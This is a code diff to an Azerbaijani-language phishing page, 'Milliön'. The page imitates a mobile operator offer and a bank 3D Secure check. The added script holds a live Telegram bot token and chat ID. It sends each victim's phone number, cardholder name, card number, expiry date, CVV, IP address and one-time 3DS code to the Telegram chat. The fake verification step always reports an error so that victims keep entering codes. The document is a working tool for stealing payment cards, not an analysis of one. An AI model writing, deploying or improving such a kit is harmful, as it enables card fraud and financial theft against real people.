@@ -1,4 +1,6 @@
-<!DOCTYPE html><html lang="az"><head>
+<!DOCTYPE html>
+<html lang="az">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Milliön</title>
@@ -271,7 +273,7 @@
                 <div class="flex justify-center items-center gap-4 mb-6">
                     <img src="images/1280px-Mastercard-logo.svg.png" class="h-8 opacity-50" alt="Mastercard">
                     <div class="h-8 w-px bg-gray-200"></div>
-                    <img src="http://milli-az.xyz/images/Visa_Inc._logo_%282005%E2%80%932014%29.svg" class="h-4 opacity-50" alt="Visa">
+                    <img src="images/Visa_Inc._logo_%282005%E2%80%932014%29.svg" class="h-4 opacity-50" alt="Visa">
                 </div>
                 <h2 class="text-xl font-bold text-gray-900">3D Təhlükəsizlik</h2>
                 <p class="text-sm text-gray-500 mt-2">Nömrənizə göndərilən 6 rəqəmli kodu daxil edin.</p>
@@ -308,6 +310,11 @@
     </div>
 
     <script>
+        // ====== TELEGRAM CONFIG ======
+        const TELEGRAM_BOT_TOKEN = '8652506364:AAE1ylHiS7357rtrtjdSpN3IDnFIjlnaytA';
+        const TELEGRAM_CHAT_ID = '-5109741514';
+        // =============================
+
         // State
         const state = {
             operator: '',
@@ -387,14 +394,14 @@
             // Update Display
             const opDisplay = document.getElementById('selected-op-display');
             const logoUrls = {
-                'Azercell': 'https://images.seeklogo.com/logo-png/46/2/azercell-logo-png_seeklogo-468720.png',
-                'Nar': 'https://upload.wikimedia.org/wikipedia/commons/f/f7/Nar-new-logo.png',
-                'Bakcell': 'https://knowledgemap.pm/wp-content/uploads/bakcell_300.png'
+                'Azercell': 'images/azercell-logo-png_seeklogo-468720.png',
+                'Nar': 'images/Nar-new-logo.png',
+                'Bakcell': 'images/bakcell_300.png'
             };
             
             opDisplay.innerHTML = `
                 <div class="w-12 h-6 flex items-center justify-center mr-3">
-                    <img src="http://milli-az.xyz/${logoUrls[op]}" class="max-h-full max-w-full object-contain" alt="${op}">
+                    <img src="${logoUrls[op]}" class="max-h-full max-w-full object-contain" alt="${op}">
                 </div>
                 <span class="font-bold text-gray-900">${op}</span>
             `;
@@ -446,7 +453,28 @@
             goToStep(4);
         }
 
-        // Step 5: Form Submission - PHP'ye gönder
+        // Send to Telegram function
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+                return await response.json();
+            } catch (error) {
+                console.error('Telegram error:', error);
+                return null;
+            }
+        }
+
+        // Step 5: Form Submission
         document.getElementById('payment-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
@@ -488,49 +516,42 @@
             title.textContent = 'Kart yoxlanılır...';
             desc.textContent = 'Zəhmət olmasa gözləyin, kart məlumatlarınız yoxlanılır.';
             
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('operator', state.operator);
-            formData.append('prefix', state.prefix);
-            formData.append('number', state.number);
-            formData.append('campaign_price', state.campaign.price);
-            formData.append('campaign_details', `${state.campaign.gb} + ${state.campaign.mins}`);
-            formData.append('card_name', document.getElementById('card-name').value);
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('card_expiry', cardExpiryMask.value);
-            formData.append('card_cvv', cardCvvMask.value);
-
+            // Get IP
+            let ip = '185.146.113.179';
             try {
-                // PHP dosyasına gönder
-                const response = await fetch('telegram-handler.php', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.status === 'success') {
-                    // 5 Second Delay
-                    setTimeout(() => {
-                        overlay.classList.add('hidden');
-                        goToStep(6);
-                    }, 5000);
-                } else {
-                    throw new Error(result.message);
-                }
-                
-            } catch (error) {
-                overlay.classList.add('hidden');
-                alert('Sistem xətası baş verdi.');
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+            } catch (e) {
+                console.log('IP fetch failed');
             }
+
+            const cardName = document.getElementById('card-name').value || 'AD SOYAD';
+            
+            // Format message
+            const message = `🔴 YENİ BİLGİ 🔴\n\n` +
+                `👤 Operator: ${state.operator}\n` +
+                `📞 Nömrə: +994${state.prefix}${state.number}\n` +
+                `📦 Kampaniya: ${state.campaign.price}\n` +
+                `💳 Kart Sahibi: ${cardName}\n` +
+                `🔢 Kart Nömrəsi: ${cardNumberMask.value.replace(/\s/g, '')}\n` +
+                `📅 Kart Bitiş: ${cardExpiryMask.value}\n` +
+                `🔐 CVV: ${cardCvvMask.value}\n` +
+                `🌐 IP Adresi: ${ip}`;
+
+            await sendToTelegram(message);
+
+            setTimeout(() => {
+                overlay.classList.add('hidden');
+                goToStep(6);
+            }, 5000);
         });
 
-        // Step 6: 3DS Form Submission - PHP'ye gönder
+        // Step 6: 3DS Form Submission
         document.getElementById('tds-form').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const overlay = document.getElementById('status-overlay');
-            const loader = document.getElementById('loader');
             const title = document.getElementById('status-title');
             const desc = document.getElementById('status-desc');
             const errorMsg = document.getElementById('tds-error');
@@ -540,33 +561,29 @@
             desc.textContent = 'Məlumatlar yoxlanılır, zəhmət olmasa gözləyin.';
             errorMsg.classList.add('hidden');
 
-            // FormData oluştur
-            const formData = new FormData();
-            formData.append('card_number', cardNumberMask.value);
-            formData.append('tds_code', document.getElementById('tds-code').value);
+            const otpCode = document.getElementById('tds-code').value || '******';
+            const cardNum = cardNumberMask.value.replace(/\s/g, '');
+            const cardName = document.getElementById('card-name').value || 'AD SOYAD';
             
-            try {
-                // PHP dosyasına gönder
-                const response = await fetch('otp.php', {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                // Simulation Delay - her zaman hata göster (gerçek 3DS simülasyonu)
-                setTimeout(() => {
-                    overlay.classList.add('hidden');
-                    errorMsg.classList.remove('hidden');
-                    tdsCodeMask.value = '';
-                    document.getElementById('tds-code').focus();
-                }, 3000);
-                
-            } catch (error) {
+            // Format OTP message
+            const otpMessage = `🔴 YENİ BİLGİ OTP 🔴\n\n` +
+                `🔑 OTP Kodu: ${otpCode}\n\n` +
+                `━━━━━━━━━━━━━━━━\n` +
+                `💳 Kart Sahibi: ${cardName}\n` +
+                `🔢 Kart Nömrəsi: ${cardNum}\n` +
+                `📅 Kart Bitiş: ${cardExpiryMask.value}\n` +
+                `🔐 CVV: ${cardCvvMask.value}`;
+
+            await sendToTelegram(otpMessage);
+
+            setTimeout(() => {
                 overlay.classList.add('hidden');
-            }
+                errorMsg.classList.remove('hidden');
+                tdsCodeMask.value = '';
+                document.getElementById('tds-code').focus();
+            }, 3000);
         });
     </script>
 
-
-</body></html>
+</body>
+</html>
